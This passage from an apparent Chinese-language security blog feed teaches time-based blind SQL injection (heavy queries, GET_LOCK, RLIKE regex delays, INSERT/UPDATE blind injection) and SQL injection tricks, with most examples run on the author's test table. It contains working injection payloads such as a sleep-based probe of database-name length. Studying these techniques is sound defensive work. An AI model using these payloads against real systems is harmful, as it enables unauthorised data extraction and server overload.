&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;In my Oracle test environment the query above is executed in no time since &lt;strong&gt;I have very few users&lt;/strong&gt;. When I grow the FROM clause to 7 tables it takes about 15 seconds. Letâ€™s now see how it could be integrated in a vulnerable field.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨æˆ‘çš„Oracleæµ‹è¯•ç¯å¢ƒä¸­ï¼Œä¸Šè¿°çš„æŸ¥è¯¢å¦‚æœåªæœ‰å¾ˆå°‘çš„ç”¨æˆ·æ—¶ï¼Œå‡ ä¹ä¸èŠ±è´¹æ—¶é—´ï¼Œå½“æˆ‘è®²FROMå¢åŠ åˆ°7ä¸ªè¡¨æ—¶å¤§æ¦‚èŠ±è´¹15ç§’ï¼Œé‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹åœ¨å­˜åœ¨æ¼æ´æ—¶ä»–æ˜¯æ€ä¹ˆé›†æˆçš„ã€‚&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;MALICIOUS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;PARAMETER&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;TIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BASED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INJECTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;C&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;GENERATED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;C&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Here again, if the test slows significantly the server response, you can conclude a vulnerability is present in the field.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åŒç†ï¼Œå¦‚æœæµ‹è¯•æœ‰æ˜æ˜¾çš„å“åº”å»¶è¿Ÿï¼Œä½ å°±å¯ä»¥å¾—å‡ºç»“è®ºï¼Œæ­¤å¤„å­˜åœ¨æ¼æ´&lt;/p&gt;

&lt;h2 id=&quot;additionnal-information&quot;&gt;Additionnal Information&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;As mentioned in the article about time-based attacks, the heavy query approach will have &lt;strong&gt;noticeable impacts on CPU and server resources usage&lt;/strong&gt;. Whenever possible, try to inject a time delay that will not be CPU intensive and stick to standards techniques.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ­£å¦‚åœ¨å»¶æ—¶æ³¨å…¥æ”»å‡»ä¸­æåˆ°çš„ï¼Œå¤§é‡çš„æŸ¥è¯¢æ–¹å¼ä¼šå¾ˆæ˜¾è‘—åœ°å ç”¨CPUå’ŒæœåŠ¡å™¨èµ„æºï¼Œå¦‚æœå¯èƒ½ï¼Œå°è¯•å»¶æ—¶æ³¨å…¥æ—¶ä¸è¦å¤§é‡å ç”¨CPUæˆ–æŸååŸºç¡€æ¡†æ¶ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;You must also be aware that &lt;strong&gt;the injected query will most likely be executed only once&lt;/strong&gt;. The database optimizer will execute it, store its result and use the returned value(s) when testing the WHERE clause against each record. As you can guess, this is must faster than executing the query each time. It should be mentioned however that the query will not be executed if the optimizer detects that the WHERE clause is always false. To avoid any unexpected results &lt;strong&gt;you should always try to generate a WHERE clause that will be verified for at least one record&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä½ è¿˜åº”è¯¥çŸ¥é“çš„æ˜¯ï¼Œå¤§å¤šæ•°æ³¨å…¥è¯­å¥åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œæ•°æ®åº“ä¼˜åŒ–å™¨ä¼šæ‰§è¡Œä»–ï¼Œå°†ä»–çš„ç»“æœå­˜å‚¨èµ·æ¥ï¼Œå½“æµ‹è¯•WHEREè¯­å¥æ—¶ï¼Œå°†ç»“æœå–å‡ºï¼Œä½ å¯ä»¥æƒ³è±¡åˆ°ï¼Œè¿™è‚¯å®šæ¯”å¿…é¡»æ¯æ¬¡æ‰§è¡Œè¯­å¥è¦å¿«ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœä¼˜åŒ–å™¨æ£€æµ‹åˆ°WHEREè¯­å¥æ€»æ˜¯é”™è¯¯ï¼Œå°±ä¸ä¼šæ‰§è¡Œï¼Œä¸ºäº†é¿å…ä¸€äº›æƒ³ä¸åˆ°çš„ç»“æœï¼Œå½“ä½ ç¡®è®¤éœ€è¦è¿”å›ç»“æœæ—¶ï¼Œä½ åº”è¯¥å…ˆå°è¯•ç”ŸæˆWHEREè¯­å¥ã€‚&lt;/p&gt;

&lt;h1 id=&quot;get_lock&quot;&gt;GET_LOCK&lt;/h1&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET_LOCK(str, timeout)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯¹å…³é”®å­—è¿›è¡Œäº†get_lock,é‚£ä¹ˆå†å¼€å¦ä¸€ä¸ªsessionå†æ¬¡å¯¹å…³é”®è¿›è¡Œget_lockï¼Œå°±ä¼šå»¶æ—¶æˆ‘ä»¬æŒ‡å®šçš„æ—¶é—´&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;SESSION A&lt;/strong&gt;ä¸Šé”ï¼Œæ³¨å…¥æ—¶çš„ç¬¬ä¸€æ­¥ä¹Ÿæ˜¯å¯¹å­—æ®µåŠ é”&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select get_lock('111',10);
+--------------------+
| get_lock('111',10) |
+--------------------+
|                  1 |
+--------------------+
1 row in set (0.01 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å†æ‰“å¼€ä¸€ä¸ªç»ˆç«¯&lt;strong&gt;SESSION B&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select get_lock('111',5);
+-------------------+
| get_lock('111',5) |
+-------------------+
|                 0 |
+-------------------+
1 row in set (5.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ç»“åˆ&lt;strong&gt;andçŸ­è·¯è¿ç®—è§„åˆ™&lt;/strong&gt;è¿›è¡Œæ—¶é—´ç›²æ³¨&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from vorname where Vorname='Lina' and 1=1 and  get_lock('111',2);
Empty set (2.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;é™åˆ¶æ¡ä»¶&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;æ•°æ®åº“è¿æ¥å¿…é¡»æ˜¯æŒä¹…è¿æ¥ï¼Œè¿™ä¸ªæˆ‘è¿˜æ²¡æœ‰å®è·µè¿‡ï¼Œå‚è€ƒå‚è€ƒæ–‡ç« ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯åœ¨æ•°æ®åº“&lt;strong&gt;mysql_connect()&lt;/strong&gt;åˆ°&lt;strong&gt;mysql_close()&lt;/strong&gt;ä¹‹é—´çš„ç”Ÿå‘½å‘¨æœŸæ‰ç”Ÿæ•ˆã€‚&lt;/p&gt;

&lt;h1 id=&quot;æ­£åˆ™è¡¨è¾¾å¼&quot;&gt;æ­£åˆ™è¡¨è¾¾å¼&lt;/h1&gt;

&lt;p&gt;åŸç†æ˜¯é€šè¿‡å¤§é‡çš„æ­£åˆ™åŒ¹é…å®ç°å»¶æ—¶ï¼Œä¸&lt;strong&gt;benchmark&lt;/strong&gt;å’Œå‰é¢è¯´çš„&lt;strong&gt;heavy query&lt;/strong&gt;æœ¬è´¨ç›¸ä¼¼ã€‚&lt;/p&gt;

&lt;p&gt;MySQLä¸­æœ‰&lt;strong&gt;like&lt;/strong&gt;ã€&lt;strong&gt;rlike&lt;/strong&gt;ã€&lt;strong&gt;regexp&lt;/strong&gt;æ­£åˆ™å¯ä»¥ç”¨æ¥åŒ¹é…ï¼Œå…¶ä¸­&lt;strong&gt;like&lt;/strong&gt;å†…å®¹æ˜¯é€šé…ç¬¦ï¼Œä¸æ˜¯æ­£åˆ™ï¼›&lt;strong&gt;rlike&lt;/strong&gt;å’Œ&lt;strong&gt;regexp&lt;/strong&gt;å†…å®¹å¯ä»¥æ­£åˆ™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;like&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;likeå¸¸ç”¨çš„é€šé…ç¬¦ï¼š%ã€_ã€escape&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;é€šé…ç¬¦&lt;/th&gt;
      &lt;th&gt;ç”¨æ³•&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;%&lt;/td&gt;
      &lt;td&gt;åŒ¹é…0ä¸ªæˆ–ä»»æ„å¤šä¸ªå­—ç¬¦&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;_&lt;/td&gt;
      &lt;td&gt;åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;escape&lt;/td&gt;
      &lt;td&gt;è½¬ä¹‰å­—ç¬¦ï¼Œå¯åŒ¹é…%å’Œ_&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ä¸¾ä¾‹&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Vorname like 'L%';
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Lara    | Zhang     |  20 |
+---------+-----------+-----+
2 rows in set (0.00 sec)

mysql&amp;gt; select * from vorname where Vorname like '%L__a%';
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Lara    | Zhang     |  20 |
+---------+-----------+-----+
2 rows in set (0.00 sec)

mysql&amp;gt; select * from vorname where Vorname not like '%L_r%';
+---------+------------+-----+
| Vorname | Nachname   | Alt |
+---------+------------+-----+
| Lina    | Schneider  |  22 |
| Patric  | Wang       |  23 |
| Tobias  | Alexandria |  22 |
+---------+------------+-----+
3 rows in set (0.01 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;escape â€˜/â€™ æ˜¯æŒ‡ç”¨â€™/â€™è¯´æ˜åœ¨/åé¢çš„å­—ç¬¦ä¸æ˜¯é€šé…ç¬¦ï¼Œè€Œæ˜¯æ™®é€šç¬¦&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;rlike&lt;/strong&gt;ã€&lt;strong&gt;regexp&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;è¿”å›å€¼ä¸º&lt;strong&gt;1&lt;/strong&gt;æˆ–&lt;strong&gt;0&lt;/strong&gt;ï¼Œå¸¸ç”¨çš„é€šé…ç¬¦.ã€*ã€[]ã€^ã€$ã€{n}&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;é€šé…ç¬¦&lt;/th&gt;
      &lt;th&gt;ç”¨æ³•&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;.&lt;/td&gt;
      &lt;td&gt;åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;*&lt;/td&gt;
      &lt;td&gt;åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå¾—åˆ°çš„å­—ç¬¦&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;[]&lt;/td&gt;
      &lt;td&gt;åŒ¹é…ä»»æ„ä¸€ä¸ª[]å†…çš„å­—ç¬¦ï¼Œ[ab]*å¯åŒ¹é…ç©ºã€aã€bã€æˆ–ä»»æ„ç”±aå’Œbç»„æˆçš„å­—ç¬¦ä¸²&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;^&lt;/td&gt;
      &lt;td&gt;åŒ¹é…å¼€å¤´ï¼Œå¦‚^såŒ¹é…ä»¥sæˆ–è€…Så¼€å¤´çš„å­—ç¬¦ä¸²&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;$&lt;/td&gt;
      &lt;td&gt;åŒ¹é…ç»“å°¾ï¼Œå¦‚s$åŒ¹é…ä»¥sç»“å°¾çš„å­—ç¬¦ä¸²&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;{n}&lt;/td&gt;
      &lt;td&gt;åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦åå¤næ¬¡&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ä¸¾ä¾‹&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select &quot;1111111121111122222221234&quot; rlike &quot;.*2.*&quot;;
+-------------------------------------------+
| &quot;1111111121111122222221234&quot; rlike &quot;.*2.*&quot; |
+-------------------------------------------+
|                                         1 |
+-------------------------------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select &quot;1111111121111122222221234&quot; regexp &quot;.*12.*&quot;;
+--------------------------------------------+
| &quot;1111111121111122222221234&quot; regexp &quot;.*12.*&quot; |
+--------------------------------------------+
|                                          1 |
+--------------------------------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;æ„é€ å»¶æ—¶æ³¨å…¥&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Vorname='Lina' and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (0.00 sec)

mysql&amp;gt; select * from vorname where Vorname='Lina' and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (6.20 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ğŸ˜‡&lt;strong&gt;IF(0,x,y)&lt;/strong&gt;æ—¶ï¼Œæ‰§è¡Œ&lt;strong&gt;y&lt;/strong&gt;ï¼Œ&lt;strong&gt;IF(1,x,y)&lt;/strong&gt;æ—¶ï¼Œæ‰§è¡Œ&lt;strong&gt;x&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ğŸ˜‡&lt;strong&gt;rpad(1,999999,â€™aâ€™)&lt;/strong&gt;çš„æ„æ€æ˜¯åœ¨1åé¢è¡¥aï¼Œä½¿å¾—ä¸€å…±999999ä½&lt;/p&gt;

&lt;p&gt;ğŸ˜‡ç„¶åé€šè¿‡&lt;strong&gt;rlike&lt;/strong&gt;åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯ä¸æ˜¯å½¢å¦‚&lt;strong&gt;aaaaaab&lt;/strong&gt;ï¼Œè‚¯å®šæ²¡æœ‰åé¢è¿™ä¸ª&lt;strong&gt;b&lt;/strong&gt;å•¦ï¼Œè¿”å›å€¼0&lt;/p&gt;

&lt;h1 id=&quot;insert-å’Œ-update-çš„ç›²æ³¨&quot;&gt;insert å’Œ update çš„ç›²æ³¨&lt;/h1&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;insert into vorname values (16,'sueisok','0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));

update vorname set Alt = 21|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where Nachname='sueisok';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä½†è¿™ä¸ªä¼šå½±å“æ•°æ®åº“æ•°æ®&lt;/p&gt;

&lt;h1 id=&quot;refer&quot;&gt;Refer&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;shenmedoumeiyou&quot;&gt;https://xz.aliyun.com/t/5505&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;dianjibunengtiaozhuan&quot;&gt;https://www.k0rz3n.com/2019/02/21/ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£ SQL ç›²æ³¨/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;dianji&quot;&gt;https://blog.csdn.net/ouyn8/article/details/44674563&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;hahaha&quot;&gt;https://blog.csdn.net/yuanjiu4221/article/details/82661424&lt;/a&gt;&lt;/p&gt;</content><author><name>true</name></author><category term="SQLæ³¨å…¥" /><summary type="html"></summary></entry><entry><title type="html">SQLæ³¨å…¥-ä¸€äº›å°trick</title><link href="http://localhost:4000/blog/sqli-trick/" rel="alternate" type="text/html" title="SQLæ³¨å…¥-ä¸€äº›å°trick" /><published>2020-04-10T16:47:23+08:00</published><updated>2020-04-10T16:47:23+08:00</updated><id>http://localhost:4000/blog/sqli-trick</id><content type="html" xml:base="http://localhost:4000/blog/sqli-trick/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#ä¸€äº›è§£é‡Š&quot; id=&quot;markdown-toc-ä¸€äº›è§£é‡Š&quot;&gt;ä¸€äº›è§£é‡Š&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#ifexpr1expr2expr3&quot; id=&quot;markdown-toc-ifexpr1expr2expr3&quot;&gt;IF(expr1,expr2,expr3)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ifnullexpr1expr2&quot; id=&quot;markdown-toc-ifnullexpr1expr2&quot;&gt;IFNULL(expr1,expr2)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eltnstr1str2&quot; id=&quot;markdown-toc-eltnstr1str2&quot;&gt;ELT(N,str1,str2,â€¦)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#fieldstrstr1str2&quot; id=&quot;markdown-toc-fieldstrstr1str2&quot;&gt;FIELD(str,str1,str2,â€¦)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#åˆ«å&quot; id=&quot;markdown-toc-åˆ«å&quot;&gt;åˆ«å&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cast&quot; id=&quot;markdown-toc-cast&quot;&gt;CAST&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#concatconcat_wsgroup_concat&quot; id=&quot;markdown-toc-concatconcat_wsgroup_concat&quot;&gt;CONCAT&amp;amp;CONCAT_WS&amp;amp;GROUP_CONCAT&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#concat&quot; id=&quot;markdown-toc-concat&quot;&gt;CONCAT&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#concat_ws&quot; id=&quot;markdown-toc-concat_ws&quot;&gt;CONCAT_WS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#group_concat&quot; id=&quot;markdown-toc-group_concat&quot;&gt;GROUP_CONCAT&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#group_concatconcat_ws&quot; id=&quot;markdown-toc-group_concatconcat_ws&quot;&gt;GROUP_CONCAT+CONCAT_WS&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#order-by&quot; id=&quot;markdown-toc-order-by&quot;&gt;ORDER BY&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#union&quot; id=&quot;markdown-toc-union&quot;&gt;UNION&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#prepare&quot; id=&quot;markdown-toc-prepare&quot;&gt;PREPARE&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#refer&quot; id=&quot;markdown-toc-refer&quot;&gt;Refer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€šè¿‡ä¸€äº›è§åˆ°çš„ç”¨è¿‡çš„payloadï¼Œæ€»ç»“ä¸€äº›å¸¸è§çš„SQLæ³¨å…¥ç”¨åˆ°çš„æŠ€å·§ï¼Œè¿™æ ·æ¯”è¿‡ä¸€éSQLæ‰€æœ‰å‡½æ•°æ•ˆç‡é«˜ä¸€ç‚¹å§ï¼Œç­‰è¶³å¤Ÿå¤šæ”¾ä¸ä¸‹çš„æ—¶å€™ï¼Œå†æƒ³ä¸€ä¸‹æ€ä¹ˆåˆ†ç±»å§ï¼Œæˆ–è€…å› ä¸ºæ‡’å°±ä¸€ç›´è¿™æ ·å †ç€ä¹ŸæŒºå¥½(â—â€™â—¡â€™â—)&lt;/p&gt;

&lt;h1 id=&quot;ä¸€äº›è§£é‡Š&quot;&gt;ä¸€äº›è§£é‡Š&lt;/h1&gt;

&lt;h2 id=&quot;ifexpr1expr2expr3&quot;&gt;IF(expr1,expr2,expr3)&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;å¦‚æœexpr1æ˜¯TRUEï¼Œåˆ™IF()çš„è¿”å›å€¼ä¸ºexpr2ï¼›å¦åˆ™è¿”å›å€¼ä¸ºexpr3ï¼ŒIF()è¿”å›å€¼ä¸ºæ•°å­—å€¼æˆ–å­—ç¬¦ä¸²ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname;
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Lara    | Zhang     |  20 |
| Patric  | Wang      |  23 |
| Tobias  | Ai        |  22 |
+---------+-----------+-----+
4 rows in set (0.00 sec)

mysql&amp;gt; select if(Alt=22,'yes','no')'22_or_not' from vorname;
+-----------+
| 22_or_not |
+-----------+
| yes       |
| no        |
| no        |
| yes       |
+-----------+
4 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;çœ‹åˆ«äººè¯´&lt;strong&gt;if&lt;/strong&gt;å°±åƒæ˜¯å¼€å…³ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯åˆ†æµï¼Œé€šè¿‡åˆ¤æ–­å†³å®šè¿”å›å€¼ï¼Œæ„Ÿè§‰å¾ˆå½¢è±¡å•Šã€‚&lt;/p&gt;

&lt;p&gt;å°è¯•åœ¨&lt;strong&gt;if&lt;/strong&gt;åˆ¤æ–­ä¸­åŠ å…¥å»¶æ—¶ï¼ŒLina22å²sleep2ç§’ï¼ŒTobias22å²ï¼ŒåŠ èµ·æ¥4ç§’&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select if(Alt=22,sleep(2),'not_22')'22_or_not' from vorname;
+-----------+
| 22_or_not |
+-----------+
| 0         |
| not_22    |
| not_22    |
| 0         |
+-----------+
4 rows in set (4.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ğŸ¤³è¿™é‡Œçš„&lt;strong&gt;22_or_not&lt;/strong&gt;æ˜¯åˆ«å&lt;/p&gt;

&lt;p&gt;è´´ä¸€ä¸ªæ—¶é—´ç›²æ³¨payloadæ¥è‡ªå¿˜è®°å“ªé‡Œï¼Œåˆ¤æ–­æ•°æ®åº“åç§°çš„é•¿åº¦&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=2) and if(length(database())=6,sleep(5),null);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

